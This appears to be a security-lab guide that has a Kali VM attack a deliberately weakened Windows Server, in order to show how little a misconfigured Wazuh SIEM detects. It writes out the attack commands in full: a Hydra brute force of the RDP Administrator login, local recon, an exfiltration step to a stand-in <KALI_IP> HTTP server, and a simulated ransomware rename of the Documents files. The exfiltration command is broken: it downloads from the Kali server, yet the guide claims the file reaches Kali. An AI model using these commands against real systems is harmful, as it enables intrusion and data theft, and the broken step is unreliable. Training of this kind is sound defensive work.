# 🟥 Scenario 1 — Low Visibility  
### *Attacker gains full access due to weak passwords and missing logging*

# 🟦 Environment Overview — (Windows Server State)

Before the attack begins, the Windows Server environment is intentionally misconfigured.  
This represents a common real-world scenario in small companies with weak security maturity.

---

## 🔐 Password & Account Security

### ❌ Weak password policy
- Password complexity: **Disabled**
- Minimum length: **0**
- Maximum password age: **Unlimited**
- Lockout threshold: **Disabled**
- Lockout duration: **0**
- Lockout observation window: **0**

This allows:
- simple passwords (e.g., Admin123)
- unlimited brute-force attempts
- successful password spraying with no timeout

**Screenshot to take:**  
➡️ `secpol.msc` → Account Policies → Password Policy  
➡️ `secpol.msc` → Account Lockout Policy

---

## 🌐 Network Exposure

### ✅ Open ports
| Port | Service | State |
|------|---------|--------|
| **3389/tcp** | RDP | **Open** (publicly accessible) |
| **5985** | WinRM HTTP | Closed |
| **5986** | WinRM HTTPS | Closed |
| **445** | SMB | Likely open internally, closed externally |
| **22** | SSH | Closed |
| **All others** | Default | Closed |

**Risk:**  
RDP is exposed directly without MFA or IP restrictions.

**Screenshot to take:**  
➡️ Nmap output confirming 3389 open

---

## 📊 Logging & Visibility

### ❌ Windows Audit Policy (default / minimal)
- Logon events → **Not fully enabled**
- Object access → **Disabled**
- Process creation → **Disabled**
- Policy change → **Disabled**
- Directory service access → **Disabled**
- Filtering platform logs → **Disabled**

This results in:
- Missing 4625 (failed logon) context
- Missing 4624 (successful logon) details
- Missing 4688 (process creation)
- No visibility into attacker recon or file operations

**Screenshot to take:**  
➡️ Local Security Policy → Advanced Audit Policy Configuration

---

## 👁️ Sysmon Visibility

### ❌ Sysmon is not installed
Meaning:
- No Event ID 1 (process creation)
- No Event ID 3 (network connections)
- No Event ID 11 (file creation)
- No Event ID 12/13 (registry changes)

Without Sysmon, a huge portion of attacker activity is invisible.

**Screenshot to take:**  
➡️ Programs list / Sysmon missing  
➡️ PowerShell: `Get-Service sysmon*` → nothing found

---

## 📡 Wazuh Agent State

### ⚠️ Wazuh agent installed but misconfigured
- Only a few Windows Security Events are forwarded  
- Sysmon module missing  
- No FIM (File Integrity Monitoring)  
- No Command Execution monitoring  
- No PowerShell module active  

Effectively:
- Wazuh receives **almost no telemetry**  
- Attack chain will not generate alerts  
- SOC analyst would see very limited or no data

**Screenshot to take:**  
➡️ Wazuh agent Manager → Missing modules  
➡️ Wazuh dashboard (empty events)

---

## 🧱 Firewall & Exposure

### ❌ Firewall not hardened
- RDP allowed from **any IP**  
- No geoblocking  
- No brute-force detection  
- No rate limiting  
- No network-level segmentation

---

## 📌 Summary of Weaknesses

This environment suffers from:

- Weak passwords  
- No password lockout policy  
- Poor visibility (no Sysmon, weak Audit Policy)  
- Misconfigured SIEM agent  
- Exposed RDP service  
- No SOC response capability  

This makes Scenario 1 a **perfect starting point** to demonstrate how devastating a simple brute-force attack can be in a low-maturity environment.

---
---

This is the execution guide you will follow step-by-step while performing the lab.  
It includes:  
- What to do  
- When to screenshot  
- When to take snapshots  
- What output to expect  

---

# 📌 Before You Start

### ✔ Snapshot the Windows Server VM (GCP)
Name: `scenario1_start`

### ✔ Snapshot the Kali VM (UTM)
Name: `scenario1_start`

### ✔ Verify weak logging on Windows
- No Sysmon  
- Default/minimal Audit Policy  
- Wazuh agent misconfigured  

**Screenshot:**  
➡️ Audit Policy panel  
➡️ Wazuh agent status (missing modules / errors)

---

# 1️⃣ Reconnaissance From Kali

### 🔎 1.1 Basic port scan

\`\`\`bash
nmap -sV -p 3389,22 <WINDOWS_IP>
\`\`\`

**Expected result:**
- 3389/tcp open (RDP)
- 22/tcp closed

**Screenshot:**  
➡️ Nmap terminal output

---

# 2️⃣ Brute Force (No Lockout Policy)

### 🔐 2.1 Create a simple password list

\`\`\`bash
echo -e "Admin123\nPassword123\nWelcome1\nAdmin\nUser123" > small.txt
\`\`\`

### 🔐 2.2 Hydra brute force attack

\`\`\`bash
hydra -l Administrator -P small.txt rdp://<WINDOWS_IP>
\`\`\`

**Expected:** Hydra finds valid password.

**Screenshot:**  
➡️ Hydra “login successful” output

---

# 3️⃣ RDP Login

### 💻 3.1 Connect to Windows Server

\`\`\`bash
xfreerdp /v:<WINDOWS_IP> /u:Administrator /p:Admin123
\`\`\`

**Screenshot:**  
➡️ Windows desktop after login (timestamp visible)

---

# 4️⃣ Basic Post-Compromise Recon

Run these inside the Windows RDP session.

### 🧍 4.1 Identity + hostname

\`\`\`powershell
whoami
hostname
\`\`\`

### 🖥 4.2 System info

\`\`\`powershell
systeminfo
\`\`\`

### 🌐 4.3 Network info

\`\`\`powershell
ipconfig /all
\`\`\`

### 👥 4.4 Local user enumeration

\`\`\`powershell
net user
\`\`\`

### 📁 4.5 Directory browsing

\`\`\`powershell
dir C:\Users
dir C:\Users\Administrator\Desktop
\`\`\`

**Screenshot:**  
➡️ A single screenshot showing: whoami, systeminfo, ipconfig, net user

---

# 5️⃣ Data Discovery & Exfiltration

### 📄 5.1 Create a mock sensitive file

\`\`\`powershell
echo "Sensitive report, do not share." > C:\Users\Administrator\Desktop\secret.txt
\`\`\`

**Screenshot:**  
➡️ File visible on Desktop

---

### ⬇ 5.2 Start HTTP server on Kali

\`\`\`bash
mkdir loot
cd loot
python3 -m http.server 8000
\`\`\`

### ⬆ 5.3 Exfiltrate file from Windows

\`\`\`powershell
Invoke-WebRequest -Uri http://<KALI_IP>:8000 -OutFile secret.txt
\`\`\`

Expected:
- File successfully appears in Kali’s loot directory

**Screenshot:**  
➡️ HTTP server log showing GET request  
➡️ secret.txt in Kali’s directory

---

# 6️⃣ Fake Ransomware Simulation

### 💣 6.1 Navigate to Documents

\`\`\`powershell
cd C:\Users\Administrator\Documents
\`\`\`

### 💣 6.2 Rename all files to simulate encryption

\`\`\`powershell
Get-ChildItem -File | Rename-Item -NewName { $_.Name + ".encrypted" }
\`\`\`

**Screenshot:**  
➡️ Folder showing files renamed to *.encrypted

---

# 7️⃣ Attacker Exit

### 🚪 7.1 Clean logout

\`\`\`powershell
logoff
\`\`\`

---

# 8️⃣ What Did the SIEM See? (Almost Nothing)

Open Wazuh → check:

- Security Events  
- Sysmon events (should be empty)  
- Windows authentication logs  
- File modifications  

Expected:
- Very limited or zero meaningful alerts

**Screenshot:**  
➡️ Empty/partial Wazuh dashboards

---

# 9️⃣ Lessons Learned (For Story, Not Execution)

The company realizes the need for:

- Proper Windows Audit Policy  
- Sysmon installation  
- Correct Wazuh agent configuration  
- RDP hardening  
- Password complexity enforcement  
- Creation of a basic incident response plan  

---

# 📌 End of Scenario 1

### ✔ Create snapshots  
- Windows → `scenario1_end_windows`  
- Kali → `scenario1_end_kali`

---
